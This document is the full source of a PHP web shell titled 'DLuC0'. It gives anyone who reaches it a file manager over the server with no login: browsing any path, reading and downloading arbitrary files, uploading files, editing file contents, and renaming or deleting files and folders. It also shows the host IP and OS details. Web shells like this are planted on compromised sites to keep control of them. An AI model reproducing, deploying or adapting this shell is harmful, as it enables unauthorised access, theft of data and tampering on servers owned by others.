<?php
@session_start();
@set_time_limit(0);

function iconFile($ext) {
    if ($ext == 'php') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306154.png"';
    } elseif ($ext == 'html') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306098.png"';
    } elseif ($ext == 'css') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306041.png"';
    } elseif ($ext == 'png') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306156.png"';
    } elseif ($ext == 'jpg') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306114.png"';
    } elseif ($ext == 'jpeg') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306114.png"';
    } elseif ($ext == 'zip') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2521/2521763.png"';
    } elseif ($ext == 'js') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306122.png';
    } elseif ($ext == 'ttf') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306182.png';
    } elseif ($ext == 'otf') {
        $img = 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
    } elseif ($ext == 'txt') {
        $img = 'https://cdn-icons-png.flaticon.com/512/2306/2306185.png';
    } elseif ($ext == 'ico') {
        $img = 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
    } elseif ($ext == 'conf') {
        $img = 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
    } elseif ($ext == 'htaccess') {
        $img = 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
    } elseif ($ext == 'sh') {
        $img = 'https://image.flaticon.com/icons/png/128/617/617535.png';
    } elseif ($ext == 'py') {
        $img = 'https://image.flaticon.com/icons/png/128/180/180867.png';
    } elseif ($ext == 'indsc') {
        $img = 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
    } elseif ($ext == 'sql') {
        $img = 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
    } elseif ($ext == 'pl') {
        $img = 'http://i.imgur.com/PnmX8H9.png';
    } elseif ($ext == 'pdf') {
        $img = 'https://image.flaticon.com/icons/png/128/136/136522.png';
    } elseif ($ext == 'mp4') {
        $img = 'https://image.flaticon.com/icons/png/128/136/136545.png';
    } elseif ($ext == 'mp3') {
        $img = 'https://image.flaticon.com/icons/png/128/136/136548.png';
    } elseif ($ext == 'git') {
        $img = 'https://image.flaticon.com/icons/png/128/617/617509.png';
    } elseif ($ext == 'md') {
        $img = 'https://image.flaticon.com/icons/png/128/617/617520.png';
    } else {
        $img = 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
    }

    return $img;
}
function perms($file){
    $perms = fileperms($file);
    
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['action'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: '.filesize($file));
    readfile($file);
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <title>DLuC0</title>
</head>
<style>
    img {
        width: 30px;
    }
</style>
<body data-bs-theme="dark">
    <script>async function out(icon , message){await Swal.fire({icon: icon,title: message,timer: 1000,timerProgressBar: true,});await history.go(-1);}</script>
    <div class="container-xxl mt-3">
        <div class="container d-flex flex-column justify-content-between">
            <h4>Server IP : <?php echo gethostbyname(gethostname())?></h4>
            <h4>OS : <?=php_uname()?></h4>
        </div>
        <div class="container-fluid mb-3 p-2 d-flex flex-column border border-3 rounded">
            <!-- File Path  -->
            <div class="d-flex justify-content-between align-items-center">
                <p class="fw-semibold">File Path : <?php if(isset($_GET['path'])){$path = $_GET['path'];}else{$path = getcwd();}$path = str_replace('\\','/',$path);$paths = explode('/',$path);foreach($paths as $id=>$pat){if($pat == '' && $id == 0){$a = true;echo '<a href="?path=/">/</a>';continue;}if($pat == '') continue;echo '<a href="?path=';for($i=0;$i<=$id;$i++){echo "$paths[$i]";if($i != $id) echo "/";}echo '">'.$pat.'</a> >';}?></p>
                <a href="<?=$_SERVER['PHP_SELF']?>" class="btn btn-sm btn-primary">Home</a>
            </div>
                <?php if(isset($_FILES['file'])){if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){echo '<script>swal.fire({icon:"success",text:"Done Upload"})</script>';}else{echo '<script>swal.fire({icon:"error",text:"Error While Upload"})</script>';}}?>
                <form class="d-flex justify-content-between flex-row align-items-center" enctype="multipart/form-data" method="POST">
                    <label for="formFile" class="fw-semibold form-label">File Upload :</label>
                    <input class="mx-2 form-control form-control-sm w-50" type="file" id="file" name="file">
                    <button type="submit" class="btn btn-sm btn-primary">Submit</button>
                </form>
            <!-- File Path  -->
        </div>

        <div class="border border-3 rounded">
            <?php if(isset($_GET['filesrc'])){?>
                <div class="container p-2">
                    <h5 class="text-secondary">Current File : <?php echo ($_GET['path']);?></h5>
                    <div class="border"></div>
                    <div class="content pt-1">
                        <pre><?php echo htmlspecialchars(file_get_contents($_GET['filesrc']));?></pre>
                    </div>
                </div>
            <?php }elseif(isset($_GET['action'])){if (($_GET['action']) == 'rename'){?>
                <div class="container p-2">
                <h5 class="text-secondary">Current File : <?php echo ($_GET['path'].'/'.$_GET['file']);?></h5>
                <?php if(isset($_POST['rename'])){$oldname = $path.'/'.$_GET['file'];$newname = $path.'/'.$_POST['rename'];rename($oldname , $newname);if (file_exists($newname)){echo "<script>swal.fire({icon:'warning' , text:'File Already Exist'})</script>";} else {if(rename($oldname , $newname)){echo "<script>swal.fire({icon:'success' , text:'Renamed'})</script>";}else{echo "<script>swal.fire({icon:'error' , text:'Error While Rename'})</script>";}}}?>
                <div class="border mb-2"></div>
                    <form method="POST">
                    <div class="row">
                        <label class="col-sm-2 col-form-label">Rename To :</label>
                        <div class="col-sm-10">
                            <input type="text" class="form-control" name="rename" value="<?php echo $_GET['file'];?>">
                        </div>
                    </div>
                    </form>
                </div>
            <?php } elseif ($_GET['action'] == 'edit'){$fullname = $path.'/'.$_GET['file'];if(isset($_POST['filesrc'])){$fp = fopen($fullname,'w');if(fwrite($fp,$_POST['filesrc'])){echo "<script>swal.fire({icon:'success',text:'".$_GET['file']." Edited Successful'})</script>";}else{echo '<font color="red">Edit File Gagal..</font><br />';}fclose($fp);}?>
                <div class="container p-2">
                    <h5 class="text-secondary">Current File : <?php echo ($_GET['file']);?></h5>
                    <div class="border"></div>
                    <div class="content pt-1 text-center">
                        <form method="POST">
                            <div class="form-floating" style="height:60vh;">
                                <textarea class="form-control h-100" name="filesrc"><?php echo htmlspecialchars(file_get_contents($fullname));?></textarea>
                                <label for="floatingTextarea">Source :</label>
                            </div>
                            <button type="submit" class="mt-2 btn btn-primary">Submit</button>
                        </form>
                    </div>
                </div>
            <?php } elseif ($_GET['action'] == 'delete'){if (($_GET['type'] == 'files')){$filepath = $_GET['path'].'/'.$_GET['file'];if(unlink($filepath)){echo "<script>out('success','".$_GET['file']." deleted')</script>";}else{echo "<script>out('error','Error While Removing ".$_GET['file']."')</script>";}}elseif ($_GET['type'] == 'dir'){$dirpath = $_GET['path'].'/'.$_GET['file'];if(rmdir($dirpath)){echo "<script>out('success','".$_GET['dir']." deleted')</script>";} else{echo "<script>out('error','Error While Removing ".$_GET['dir']."')</script>";} }}?>
            <?php }else{?>
            <?php $scandir = scandir($path);?>
            <table class="m-0 table table-bordered table-sm text-center">
                <thead>
                    <tr>
                        <th class="col" width=5%>#</th>
                        <th class="col">Name</th>
                        <th class="col">Size</th>
                        <th class="col">Permission</th>
                        <th class="col" width=10%>Options</th>
                    </tr>
                </thead>
                <tbody class="table-group-divider">
                    <tr><td colspan=5 class="text-white-50">-{ Folders }-</td></tr>
                    <?php foreach($scandir AS $dir) { if (!is_dir("$path/$dir") || $dir == "." || $dir == "..") continue;?>
                    <tr>
                        <td><img src="https://cdn-icons-png.flaticon.com/512/2521/2521570.png" alt="#"></td>
                        <td class="text-start"><a class='nav-link' href='?path=<?=$path.'/'.$dir?>'><?=$dir?></a></td>
                        <td>-----</td>
                        <td>
                            <?php if (is_writable("$path/$dir")){?><p class="text-success-emphasis">
                            <?php } elseif (!is_writable("$path/$dir")){?><p class="text-danger-emphasis">
                            <?php } echo perms("$path/$dir")?>
                            <?php if (is_writable("$path/$dir") || !is_readable("$path/$dir")) {?></p><?php }?>
                        </td>
                        <td>
                            <div class="d-flex justify-content-evenly">
                                <a href="?path=<?=$path?>&action=rename&file=<?=$dir?>"><i class="fa-solid fa-pen-to-square"></i>
                                <a href="?path=<?=$path?>&action=delete&file=<?=$dir?>&type=dir"><i class="fa-solid fa-trash"></i>
                            </div>
                        </td>
                    </tr>
                    <?php } ?>
                    <tr><td colspan=5 class="text-white-50">-{ Files }-</td></tr>
                    <tr>
                        <?php foreach($scandir AS $Files){$Combine = "$path/$Files"; if(!is_file($Combine)) continue;$size = filesize($Combine)/1024;$size = round($size,3);if($size >= 1024){$size = round($size/1024,2)."MB";}else{$size = $size."KB";}$ext = strtolower(pathinfo($Files, PATHINFO_EXTENSION));?>
                        <td><img src="<?=iconFile($ext)?>" alt="#"></td>
                        <td class="text-start"><a href="?filesrc=<?=$Combine?>&path=<?=$path?>"><?=$Files?></a></td>
                        <td><?=$size?></td>
                        <td>
                            <?php if(is_writable($Combine)){?><p class="text-success-emphasis">
                            <?php } elseif(!is_writable($Combine)){?><p class="text-danger-emphasis">
                            <?php } echo perms($Combine);?>
                            <?php if(is_writable($Combine) || !is_readable($Combine)) {?></p><?php }?>
                        </td>
                        <td>
                            <div class="d-flex justify-content-evenly">
                                <a href="?path=<?=$path?>&action=rename&file=<?=$Files?>"><i class="fa-solid fa-pencil"></i></a>
                                <a href="?path=<?=$path?>&action=edit&file=<?=$Files?>"><i class="fa-solid fa-edit"></i></a>
                                <a href="?path=<?=$path?>&action=download&file=<?=$Files?>"><i class="fa-solid fa-download"></i></a>
                                <a href="?path=<?=$path?>&action=delete&file=<?=$Files?>&type=files"><i class="fa-solid fa-trash"></i></a>
                            </div>
                        </td>
                    </tr>
                    <?php } ?>
                </tbody>
            </table>
        </div>
        <?php }?>
    </div>
</body>
</html>